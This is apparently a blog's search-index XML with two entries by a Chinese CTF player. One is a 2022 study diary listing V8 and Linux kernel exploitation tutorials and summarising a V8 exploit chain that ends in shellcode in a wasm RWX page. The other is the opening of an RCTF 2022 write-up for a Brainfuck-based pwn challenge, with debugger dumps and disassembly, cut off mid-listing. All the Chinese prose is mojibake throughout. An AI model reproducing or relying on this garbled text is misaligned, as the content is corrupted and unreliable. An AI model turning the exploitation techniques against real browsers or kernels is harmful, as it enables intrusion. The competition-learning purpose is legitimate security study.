<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆé±¼</title>
    <link href="/posts/f584cbf7.html"/>
    <url>/posts/f584cbf7.html</url>
    
    <content type="html"><![CDATA[<h2 id="æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆğŸŸ"><a class="header-anchor" href="#æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆğŸŸ">Â¶</a>æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆğŸŸ</h2><h3 id="2022-10-23"><a class="header-anchor" href="#2022-10-23">Â¶</a>2022.10.23</h3><h4 id="ä¸­ç§‘å¤§çš„-HackerGame-çœŸå¥½ç©-jpg"><a class="header-anchor" href="#ä¸­ç§‘å¤§çš„-HackerGame-çœŸå¥½ç©-jpg">Â¶</a>ä¸­ç§‘å¤§çš„ HackerGame çœŸå¥½ç©.jpg</h4><p>å¾ˆæ—©å‰å°±è€ƒè™‘å­¦ä¸€ç‚¹æ›´å¥‡æ€ªçš„ä¸œè¥¿äº†ï¼Œè¿˜ç©ä½ é‚£ç ´ glibc ğŸã€‚å°±ä»ç¬¬ä¸€å¤©ä¸‹åˆçœ‹åˆ°ç¬¬äºŒå¤©ä¸‹åˆï¼Œå®ç°äº† V8 ä» 0 åˆ° 0.1 ï¼ˆï¼Ÿï¼‰ã€‚æ‹¿äº†ä¸ª ğŸ©¸ï¼ˆæ¶¦</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202210251120882.png" alt="image-20221025112028740"></p><p>è®°å½•ç‚¹å­¦ä¹ é“¾æ¥ï¼š</p><ul><li><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">Exploiting v8: *CTF 2019 oob-v8</a>        <em>æ–°æ‰‹å…¥é—¨å¿…çœ‹ï¼Œå†™çš„å¤ªå¥½äº†</em></li><li><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">Chrome Browser Exploitation, Part 1: Introduction to V8 and JavaScript Internals</a>         <em>ä»Šå¤©åˆšå‘çš„ç³»åˆ—æ–‡ï¼Œä¹Ÿå¾ˆè¯¦ç»†</em></li><li><a href="https://paper.seebug.org/1858/">ä» 0 å¼€å§‹å­¦ V8 æ¼æ´åˆ©ç”¨ä¹‹ CVE-2021-21225ï¼ˆä¹ï¼‰</a>        <em>ç³»åˆ—æ–‡ç« ï¼ŒCVE æ¯”è¾ƒæ–°ï¼Œé€‚åˆè·Ÿç€è°ƒè°ƒç»ƒç»ƒ</em></li><li><a href="https://github.com/Escapingbug/awesome-browser-exploit">awesome-browser-exploit</a>         <em>å¾ˆå…¨çš„è¡¨å• XDï¼Œæœ‰ç”Ÿä¹‹å¹´ç³»åˆ—ï¼ˆæŒ‡å­¦ä¹ ï¼‰</em></li></ul><p>å­¦ä¸€åœˆä¸‹æ¥è‡ªå·±çš„æ„Ÿå—ï¼š</p><p>V8 é‡Œé¢æ„Ÿè§‰ <code>è¶Šç•Œè¯»å†™/ä¸‹æ ‡è¶Šç•Œ</code> æ˜¯æœ€ç®€å•çš„æ¼æ´ç±»å‹ã€‚åªè¦èƒ½è½¬åŒ–ä¸ºè¿™ç±»çš„æ´ï¼ˆæ¯”å¦‚æŸç§æ–¹å¼æŠŠ length ğŸ‘ æˆ  -1 ï¼‰ï¼Œåœ¨å †å¸ƒå±€å¯æ§çš„æƒ…å†µä¸‹ï¼ŒåŸºæœ¬å°±èƒ½å‡º ovo</p><p>ç›®å‰æ¥è§¦åˆ°çš„åˆ©ç”¨æ–¹å¼æ„Ÿè§‰ä¹ŸæŒºå¥—è·¯åŒ–çš„ï¼Œå‚è€ƒ <a href="https://paper.seebug.org/1821/">V8 é€šç”¨åˆ©ç”¨é“¾</a>(å½“ç„¶é«˜ç‰ˆæœ¬éœ€è¦åˆ©ç”¨ JIT æˆ–è€…å…¶ä»–å¥‡æ€ªçš„æ–¹æ³•ï¼Œå‚è€ƒ <a href="https://tttang.com/archive/1443/">V8 æ²™ç®±ç»•è¿‡</a>) ï¼ŒåŸºæœ¬å°±æ˜¯è¶Šç•Œè¯»å†™æ‹¿ map æ”¹ mapï¼Œæ„é€  <code>addressOf</code> å’Œ <code>fakeObj</code> åŸè¯­ï¼Œè¿™ä¿©å‡ºæ¥ä¹‹åå°±å¯ä»¥å¾ˆç®€å•çš„æ„é€ ä»»æ„è¯»å†™ã€‚</p><p>æœ‰äº†ä»»æ„è¯»å†™ä¹‹åï¼Œè¦ä¹ˆåˆ›å»º <code>wasm</code>ï¼Œä» <code>wasmInstance</code> æ‹¿ rwx æƒé™åœ°å€å¡ <code>shellcode</code> ã€‚è¦ä¹ˆå †ä¸Šæœç´¢åœ°å€æ‹¿åˆ° <code>PIE</code> åŸºå€ï¼Œè¯» got è¡¨ leak libc è½¬åŒ–ä¸ºå¸¸è§çš„ç”¨æˆ·æ€æ”»å‡»æ‰‹æ³•ã€‚æ€»ä¹‹<strong>æ„Ÿè§‰ V8 çš„éš¾ç‚¹ä¸åœ¨åˆ©ç”¨ â•°ï¼ˆâ€µâ–¡â€²ï¼‰â•¯</strong></p><p>èƒ½å¤šå­¦ç‚¹è¿˜æ˜¯å¤šå­¦ç‚¹ ğŸ˜„</p><p>â˜€ï¸</p><h3 id="2022-10-18"><a class="header-anchor" href="#2022-10-18">Â¶</a>2022.10.18</h3><p>æ— æ„é—´åˆ·åˆ°äº†ä¸€äº›å¤§å¸ˆå‚…çš„åšå®¢ï¼Œå†æ¬¡æ„Ÿå—åˆ°äº† ctf çš„å±€é™æ€§ XDï¼Œå¯èƒ½ä¸‹ä¸€æ­¥å°±ä¸é‡ç‚¹å…³æ³¨ ctf äº†ï¼Œæ‰“æ‰“/å¤ç°é«˜è´¨é‡å›½é™…èµ›ï¼Œä¸é‡è¦çš„æ¯”èµ›ç®—äº† =ã€‚=</p><p>å¯ä»¥çš„è¯ï¼Œå»è¡¥ä¸€äº›åŸºç¡€å§ï¼Œç„¶åå¼€å§‹æçœŸæ­£çš„äºŒè¿›åˆ¶å®‰å…¨XDã€‚</p><p>â˜€ï¸</p><h3 id="2022-9-19"><a class="header-anchor" href="#2022-9-19">Â¶</a>2022.9.19</h3><h4 id="åŠ å…¥-Nu1L"><a class="header-anchor" href="#åŠ å…¥-Nu1L">Â¶</a>åŠ å…¥ <strong>Nu1L</strong></h4><p>å¾—åˆ°å¤§å¸ˆå‚…ä»¬çš„è®¤å¯æŒºå¼€å¿ƒçš„ï¼Œä¸‹ä¸€æ­¥æ˜¯å¤ç°å­¦ä¹ ä¸€äº›å¥‡å¥‡æ€ªæ€ªâ€¦</p><p>å”¯çƒ­çˆ±ä¸ä¿¡ä»»ä¸å¯è¾œè´Ÿã€‚</p><p>â˜€ï¸</p><h3 id="2022-9-12"><a class="header-anchor" href="#2022-9-12">Â¶</a>2022.9.12</h3><h4 id="å¼€å­¦ç ´é˜²å‘¨"><a class="header-anchor" href="#å¼€å­¦ç ´é˜²å‘¨">Â¶</a>å¼€å­¦ç ´é˜²å‘¨</h4><p>å¼€å­¦çš„å‰å‡ å‘¨æ€»æ˜¯ä¸€å †äº‹æƒ…ï¼Œç»ˆäºæœ‰æœºä¼šæ›´æ–°ä¸€ä¸‹åšå®¢ã€‚</p><p>æš‘å‡å…¶å®è¯´é—²ç€ä¹Ÿæ²¡æ€ä¹ˆé—²ç€ï¼Œæ‰“äº†ä¸€äº›æ¯”èµ›ï¼Œå›½èµ›å•Šï¼Œå¼ºç½‘æ¯ï¼ŒDSCTFï¼Œå…¶å®éƒ½æŒºä¸é”™çš„ï¼Œé¢˜ç›®éƒ½å¾ˆæœ‰æ„æ€ã€‚å°±æ˜¯è¿˜æ˜¯æ§åˆ¶ä¸ä½è‡ªå·±ï¼Œå­¦ä¹ æ•ˆç‡å…¶å®åªæœ‰æ™šä¸Šæ‰æœ‰ï¼Œä½†æƒ³åˆ°èº«ä½“é‡è¦ï¼Œä¹Ÿæ²¡ä¸€ç›´ç†¬å¤œäº†â€¦</p><p>è‡ªå·±ç›®å‰çš„å¿ƒè¿˜æ˜¯æ¯”è¾ƒæµ®èºï¼Œå¸Œæœ›è¿˜æ˜¯èƒ½é™ä¸‹å¿ƒæ¥ï¼Œä¸€äº›åˆå­¦æ—¶å€™çš„ç¬”è®°ç°åœ¨çœ‹æ¥å­˜åœ¨ç†è§£ä¸æ·±çğŸ”éœ¸å†™çš„æƒ…å†µã€‚æ–¹ä¾¿èµ·è§å…¨ä¸‹äº†ï¼Œä¹Ÿä¸‹å†³å¿ƒä¸‹æ¬¡å†å†™ä¸œè¥¿ï¼Œèµ„æ–™ä¸€å®šè¦æŸ¥å¥½ï¼ŒçŸ¥è¯†ç‚¹è½å®å¥½ï¼Œé“¾æ¥é™„å¥½ã€‚å¦‚æœæœ‰å¸ˆå‚…çœ‹æˆ‘çš„åšå®¢ï¼Œæˆ‘åè€Œè¿˜å‘äº†ä»–ä¸€æŠŠï¼Œé‚£è¿˜çœŸæ˜¯è«å¤§çš„ç½ªè¿‡=.=</p><p>ğŸŒ§ï¸</p><h3 id="2022-7-3"><a class="header-anchor" href="#2022-7-3">Â¶</a>2022.7.3</h3><h4 id="æ”¾æš‘å‡å•¦ï¼"><a class="header-anchor" href="#æ”¾æš‘å‡å•¦ï¼">Â¶</a>æ”¾æš‘å‡å•¦ï¼</h4><p>ç–«æƒ…å½±å“ï¼Œå†›è®­å’Œé«˜æ•°éƒ½æ¨è¿Ÿï¼Œæå‰æ”¾å‡äº†ã€‚æš‘å‡å¯ä»¥é™ä¸‹å¿ƒæ¥åšäº›äº‹æƒ…äº†ã€‚</p><p>æ ¡å†…çš„ç¤¾å›¢é‚£è¾¹ä¹Ÿè¦è€ƒè™‘ä¸€ä¸‹æ‹›äººå·¥ä½œäº†ï¼Œå¯èƒ½æœ‰ç‚¹å¤æ‚ä½†å¿…é¡»è¦å»åšã€‚</p><p>æ¯•ç«Ÿæ²¡æœ‰äººä¸€ç›´åœ¨æ‰“CTFï¼Œä½†CTFæ€»å¾—æœ‰äººåœ¨æ‰“ã€‚å¸Œæœ›æ°¸è¿œå¯„æ‰˜åœ¨åæµªã€‚ï¼ˆä¸ºä»€ä¹ˆè¯´çš„è¿™ä¹ˆæ­£ç»QwQ</p><p>â˜ï¸</p><h3 id="2022-6-15"><a class="header-anchor" href="#2022-6-15">Â¶</a>2022.6.15</h3><h4 id="èµç¾-Blog"><a class="header-anchor" href="#èµç¾-Blog">Â¶</a>èµç¾ Blog</h4><p>æœ‰ç‚¹å¿™ä¸è¿‡æ¥ã€‚å­¦æ ¡å®‰æ’çš„è¯¾ç¨‹éƒ½å¿«è¦ç»“è¯¾äº†ï¼Œæ€»å½’æ˜¯è¦åº”è€ƒï¼Œè€Œæˆ‘è‡ªå·±è¿™è¾¹çš„è¯è¯¾å†…è¿›åº¦è½ä¸‹çš„æ¯”è¾ƒå¤šï¼ˆğŸ‘´ çŸ¥é“é”™äº†ï¼‰ï¼Œèƒ½å­¦è‡ªå·±æƒ³å­¦çš„ä¸œè¥¿çš„æ—¶é—´å°±æ¯”è¾ƒå°‘ã€‚</p><p>ä»Šå¤©çœ‹äº†äº›å¤§ä½¬çš„æ¨æ–‡ï¼Œä¸€äº› CVE çš„ writeup åªèƒ½ç§°ä¹‹ä¸ºæƒŠè‰³ã€‚åšå®¢çœŸçš„æ˜¯ä¸ªå¾ˆä¼Ÿå¤§çš„ä¸œè¥¿ awaã€‚</p><p><strong>ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ ç½‘ç«™</strong></p><p><a href="https://regex101.com/">regular expressions 101</a></p><p><strong>Kernel ROP ä» 0 åˆ° 1</strong></p><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1</a></p><p><strong>ä¸€ä¸ªä¿å§†çº§ä» CVE å­¦ä¹  Kernel ROP çš„æ•™ç¨‹</strong></p><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)</a></p><p><strong>Kernel å†™çš„æ¯”è¾ƒå¤šçš„åšä¸»</strong></p><p><a href="https://www.jianshu.com/u/a12c5b882be2">bsauce</a></p><p><a href="https://kagehutatsu.com/">å½±äºŒã¤</a></p><p><a href="https://arttnba3.cn/">arttnba3</a></p><p><a href="https://blog.csdn.net/Breeze_CAT">breezeO_o</a></p><p>èµç¾æ¯ä¸€ä¸ªæ„¿æ„å†™åšå®¢çš„å¸ˆå‚…ä»¬ï¼Œç»™äº†æˆ‘å¾ˆå¥½çš„å­¦ä¹ æœºä¼šã€‚</p><p>â˜€ï¸</p><h3 id="2022-6-12"><a class="header-anchor" href="#2022-6-12">Â¶</a>2022.6.12</h3><h4 id="å½“-glibc-éšé£è€Œå»"><a class="header-anchor" href="#å½“-glibc-éšé£è€Œå»">Â¶</a>å½“ glibc éšé£è€Œå»</h4><p>å‘ç°æœ€è¿‘çš„æ¯”èµ›é¢˜ç›®éƒ½åå‘äº <strong>å» glibc åŒ–</strong> ã€‚è¿™ä¸ªä¸æ˜¯å’±è¯´çš„å‡ºé¢˜ä¸ç»™ glibc æˆ–ç‰ˆæœ¬ï¼Œé‚£ç§å±äºå‡ºé¢˜äººè¦æŒ¨ğŸ”¨ã€‚è¿™é‡Œè¯´çš„æ˜¯å‡ºé¢˜æ ¹æœ¬æ²¡ç”¨åˆ° glibcã€‚</p><p>ä¾‹å¦‚å‰ä¸€æ®µæ—¶é—´æ¯”è¾ƒç«çš„ <strong>musl pwn</strong>ï¼Œå›½èµ›çš„ <strong>LLVM PASS PWN</strong>ï¼ŒDefcon Quals 2022 çš„ <strong>Luajit</strong> ã€‚è‡³äº V8ï¼ŒDockerï¼ŒQemu å’Œå…¶ä»–å¥‡å¥‡æ€ªæ€ªçš„é…·ç‚«ç©æ„ï¼Œä»¥åå†ç¢° ğŸ‘¦ã€‚</p><p><strong>musl çš„ä¸€äº›å­¦ä¹ èµ„æ–™</strong></p><p><a href="https://tttang.com/archive/1582/">Musl ç¨‹åºåˆ†æå’Œè°ƒè¯•ç¯å¢ƒé…ç½® &amp;&amp; éƒ¨åˆ†æºç åˆ†æ - 0xRGz</a></p><p><a href="https://www.anquanke.com/post/id/246929">musl-1.2.xå †éƒ¨åˆ†æºç åˆ†æ - ä¸€åªç‹—</a></p><p><strong>LLVM çš„ä¸€äº›å­¦ä¹ èµ„æ–™</strong></p><p><a href="https://x1ng.top/2021/05/16/ciscn-%E5%88%9D%E8%B5%9B-2021-wp/#satool">ciscn åˆèµ› 2021- SATOOL - X1ng</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/12/21/llvm/">LLVM pass å®ç° C++è™šè¡¨ä¿æŠ¤ - Clangè£ç¼åº—</a></p><p><strong>LuaJIT</strong></p><p><a href="https://0xten.gitbook.io/public/defcon/2022/quals/smugglers-cove">Smugglerâ€™s Cove - 0xTen</a></p><p>â˜ï¸</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCTF 2022 Pwn bfc&amp;picStore</title>
    <link href="/posts/3573e2f.html"/>
    <url>/posts/3573e2f.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2><p>å‘¨æœ«å’Œ Nu1L çš„å¸ˆå‚…ä»¬æ‰“äº† RCTFï¼Œæ‰“å®Œå°±ä¸€ä¸ªæ„Ÿå—ï¼šæˆ‘æ€ä¹ˆè¿™ä¹ˆèœ qwqï¼Œé˜Ÿå‹æ€ä¹ˆè¿™ä¹ˆå¼º orzã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212121930382.png" alt="image-20221212193042001"></p><p>å¤œé‡Œ AAA å’Œ Organizers çš„å¸ˆå‚…ä»¬å¼€å§‹ä¸Šå·äº†ï¼Œå¾—ç»§ç»­è‚ä¸€è‚ã€‚äºæ˜¯ä¹å½“æ™šæˆ‘è¢« Mr.R å¸ˆå‚…å¸¦ç€æ‹¿äº†ä¿©ä¸ªäºŒè¡€ (<code>picStore</code>,<code>bfc</code>)ï¼Œä¸­é—´æˆ‘çš„åˆ†æé”™è¯¯æµªè´¹äº† Mr.R å¸ˆå‚…å¥½å¤šæ—¶é—´orz(æœ€å <code>bfc</code> é‡å†™äº†)â€¦æœ€åè¿˜æ˜¯æ²¡èƒ½å·è¿‡ Organizers =ã€‚=</p><hr><h2 id="bfc"><a class="header-anchor" href="#bfc">Â¶</a>bfc</h2><p>è¿™é¢˜å…¶å®å¹¶ä¸éš¾ï¼Œä»€ä¹ˆï¼Œä½ ä¸ä¼šé€†ï¼Ÿæˆ³å•¦ğŸ‘¦ğŸ»ï¼ä¸Šå½“å•¦ã€‚</p><p>å…¶å®ç›´æ¥çœ‹ <a href="https://zh.m.wikipedia.org/zh-hans/Brainfuck">wiki</a> å°±èƒ½çŸ¥é“ç¬¦å·ä»£è¡¨çš„æ„æ€ï¼š</p><p>ä¸‹é¢æ˜¯è¿™å…«ç§çŠ¶æ€çš„æè¿°ï¼Œå…¶ä¸­æ¯ä¸ªçŠ¶æ€ç”±ä¸€ä¸ª<a href="https://zh.m.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6">å­—ç¬¦</a>æ ‡è¯†ï¼š</p><table><thead><tr><th style="text-align:center">å­—ç¬¦</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center">æŒ‡é’ˆåŠ ä¸€</td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center">æŒ‡é’ˆå‡ä¸€</td></tr><tr><td style="text-align:center"><code>+</code></td><td style="text-align:center">æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼åŠ ä¸€</td></tr><tr><td style="text-align:center"><code>-</code></td><td style="text-align:center">æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼å‡ä¸€</td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center">è¾“å‡ºæŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚å†…å®¹ï¼ˆ<a href="https://zh.m.wikipedia.org/wiki/ASCII%E7%A0%81">ASCIIç </a>ï¼‰</td></tr><tr><td style="text-align:center"><code>,</code></td><td style="text-align:center">å‘æŒ‡é’ˆæ‰€æŒ‡çš„å­—èŠ‚è¾“å…¥å†…å®¹ï¼ˆASCIIç ï¼‰</td></tr><tr><td style="text-align:center"><code>[</code></td><td style="text-align:center">è‹¥æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼ä¸ºé›¶ï¼Œåˆ™å‘åè·³è½¬ï¼Œè·³è½¬åˆ°å…¶å¯¹åº”çš„<code>]</code>çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤å¤„</td></tr><tr><td style="text-align:center"><code>]</code></td><td style="text-align:center">è‹¥æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼ä¸ä¸ºé›¶ï¼Œåˆ™å‘å‰è·³è½¬ï¼Œè·³è½¬åˆ°å…¶å¯¹åº”çš„<code>[</code>çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤å¤„</td></tr></tbody></table><p>å€¼å¾—æ³¨æ„çš„æ˜¯é¢˜ç›®è‡ªå·±é­”æ”¹äº†ä¸€ä¸ª <code>?</code> æ¥ <code>malloc(0x1)</code>ã€‚</p><p>BrainfuckæŒ‡ä»¤å¯ä»¥é€ä¸€æ›¿æ¢ï¼Œç¿»è¯‘æˆ<a href="https://zh.m.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">Cè¯­è¨€</a>ï¼ˆå‡è®¾<code>ptr</code>æ˜¯<code>char *</code><a href="https://zh.m.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E9%A1%9E%E5%9E%8B">ç±»å‹</a>ï¼‰çš„è¯­å¥ä¹‹ç±»ï¼š</p><table><thead><tr><th style="text-align:center">Brainfuck</th><th style="text-align:center">C</th></tr></thead><tbody><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>++ptr;</code></td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>--ptr;</code></td></tr><tr><td style="text-align:center"><code>+</code></td><td style="text-align:center"><code>++*ptr;</code></td></tr><tr><td style="text-align:center"><code>-</code></td><td style="text-align:center"><code>--*ptr;</code></td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center"><code>putchar(*ptr);</code></td></tr><tr><td style="text-align:center"><code>,</code></td><td style="text-align:center"><code>*ptr = getchar();</code></td></tr><tr><td style="text-align:center"><code>[</code></td><td style="text-align:center"><code>while (*ptr) &#123;</code></td></tr><tr><td style="text-align:center"><code>]</code></td><td style="text-align:center"><code>&#125;</code></td></tr></tbody></table><p>å‚è€ƒ Wiki ç»™çš„ç¤ºä¾‹æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€äº›æ¯”è¾ƒæœ‰æ„æ€çš„æŒ‡ä»¤ï¼š</p><ul><li><p>å·¦ç§»åˆ° <code>*ptr='\x00'</code>:</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck">&lt;<span class="hljs-title">[</span>&lt;<span class="hljs-title">]</span><br></code></pre></td></tr></table></figure><p><code>&lt;</code> å°±æ˜¯å·¦ç§»ï¼Œ<code>[]</code> å¯ä»¥çœ‹åˆ°æ˜¯ <code>*ptr != 0</code>  çš„æ—¶å€™è¿›è¡Œå¾ªç¯ï¼Œéå¸¸å¥½ç†è§£</p></li><li><p>ä¸€ç›´è¯»å–è¾“å…¥åˆ° <code>*ptr = '\n'</code>ï¼š</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-string">,</span><span class="hljs-literal">----------</span><span class="hljs-title">[</span><span class="hljs-literal">++++++++++</span>&lt;<span class="hljs-string">,</span><span class="hljs-literal">----------</span><span class="hljs-title">]</span><br></code></pre></td></tr></table></figure><p><code>,</code> æ˜¯å…ˆ <code>read(0,ptr,1)</code> ï¼Œ<code>-</code> é‡å¤åæ¬¡æ˜¯å‡å»äº† <code>\n</code>(0xa)ï¼Œç„¶åå¦‚æœæ­¤æ—¶ <code>*ptr ~= 0</code>ï¼Œè¿›å…¥å¾ªç¯ï¼Œ<code>+</code> é‡å¤åæ¬¡æ˜¯æ¢å¤ <code>*ptr</code> ä¸ºåŸæ¥çš„å­—èŠ‚ã€‚éšåå·¦ç§»ï¼Œå¼€å§‹æ–°ä¸€è½®çš„å¾ªç¯ã€‚ä¸€ç›´åˆ° <code>*ptr = '\n'</code> ä¸ºæ­¢ã€‚</p><p>è¿™ä¸ªå°±å¾ˆæœ‰æ„æ€äº†ï¼Œå¯ä»¥åœ¨å¾ˆå°çš„ç©ºé—´æ¶ˆè€—å†…æŠŠå †æ‘åœ°ä¸Šæ‘©æ“¦ã€‚</p></li></ul><p>é‚£ä¹ˆå…¶å®å°±å¾ˆç®€å•äº†ï¼Œç›¸å½“äºæˆ‘ä»¬æ˜¯å¯ä»¥åœ¨å †ä¸Šè¿›è¡Œä»»æ„æ“ä½œäº†ã€‚ä½†æ˜¯å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ç°åœ¨å°±å»è½äº†ï¼Œå¯èƒ½ Leak å…¨äº†æœ€åè¿˜æ˜¯æ²¡æœ‰å¥½æœæ±åƒã€‚è¿˜è¦è®¤çœŸçœ‹ä¸€ä¸‹ç¨‹åºçš„å‡½æ•°ä»£ç å’Œæµç¨‹å®ç°ï¼š</p><p>åœ¨ <code>init(sub_2619)</code> å‡½æ•°æ—¶ memcpy è¿‡æ¥ä¸€å †å­—èŠ‚ç ä¹Ÿå°±æ˜¯ä¸€äº›æ¨¡æ‹Ÿ bf çš„å‡½æ•°ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212132314093.png" alt="image-20221213010852499"></p><p>è°ƒè¯•çœ‹åˆ°ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x55555555c2e0</span> â€”â–¸ <span class="hljs-number">0x55555555c2f0</span> â—‚â€” <span class="hljs-number">0x478348ffffffa8e8</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>0x478348ffffffa8e8</code> å°±æ˜¯å­—èŠ‚ç ã€‚åé¢ç”¨æˆ·è¾“å…¥å…¶å®æ˜¯ä¸€å †è·³è½¬æŒ‡ä»¤ï¼Œæ¥è°ƒç”¨æ¨¡æ‹Ÿå‡½æ•°ã€‚</p><p>æˆ‘ä»¬ç¨å¾®åˆ†æä¸€ä¸‹å‡½æ•°å®ç°ï¼Œæœ€åå®é™…ä¸Šçš„ç”»é£ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">void</span> (__fastcall *)(__int64 *))(addr + <span class="hljs-number">0xE5</span>))(&amp;qword_8460);<br></code></pre></td></tr></table></figure><p><code>&amp;qword_8460</code> å­˜æ”¾çš„æ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327460</span>: <span class="hljs-number">0</span>x00005569f<span class="hljs-number">771c620</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000010</span>&lt;-- ptr   |  now_size<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327470</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00007f<span class="hljs-number">4a157e1000</span>&lt;-- offset|  rwx_page(code)<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327480</span>: <span class="hljs-number">0</span>x00007f<span class="hljs-number">4a1540c120</span>      <span class="hljs-number">0</span>x00007f4a<span class="hljs-number">1540c460</span>&lt;-- malloc|  free<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327490</span>: <span class="hljs-number">0</span>x00007f<span class="hljs-number">4a15507940</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000002</span>&lt;-- memcpy|  ???<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f63274a0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000002</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs asm">æ£€æµ‹å½“å‰ offset:<br>   0x7f5434ba2000:      mov    rax,QWORD PTR [rdi+0x8]<br>   0x7f5434ba2004:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba2008:      inc    rbx<br>   0x7f5434ba200b:      cmp    rax,rbx<br>   0x7f5434ba200e:      jg     